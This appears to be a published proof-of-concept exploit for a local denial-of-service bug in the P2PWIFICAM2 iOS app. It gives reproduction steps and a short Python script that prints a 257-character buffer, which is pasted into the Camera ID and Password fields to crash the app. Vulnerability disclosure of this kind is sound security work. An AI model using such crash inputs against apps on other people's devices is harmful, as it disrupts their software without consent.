# Exploit Title: P2PWIFICAM2 for iOS 10.4.1 - 'Camera ID' Denial of Service (PoC)
# Discovery by: Ivan Marmolejo
# Discovery Date: 2020-02-02
# Vendor Homepage: https://apps.apple.com/mx/app/p2pwificam2/id663665207
# Software Link: App Store for iOS devices
# Tested Version: 10.4.1
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 6s iOS 13.3

# Summary: P2PWIFICAM is a matching network camera P2P (point to point) monitoring software.
# Adopt the advanced P2P technology, can make the camera in the intranet from port mapping complex, 
# truly plug and play!

# Steps to Produce the Crash:

# 1.- Run python code: P2PWIFICAM.py
# 2.- Copy content to clipboard
# 3.- Open "P2PWIFICAM" for Ios
# 4.- Go to "Add" (Touch here to add a camera)
# 5.- Go to "Input Camera"
# 6.- Paste Clipboard on "Camera ID" 
# 7.- Paste Clipboard on "Password" 
# 9.- Ok
# 10- Crashed

#!/usr/bin/env python

buffer = "\x41" * 257
print (buffer)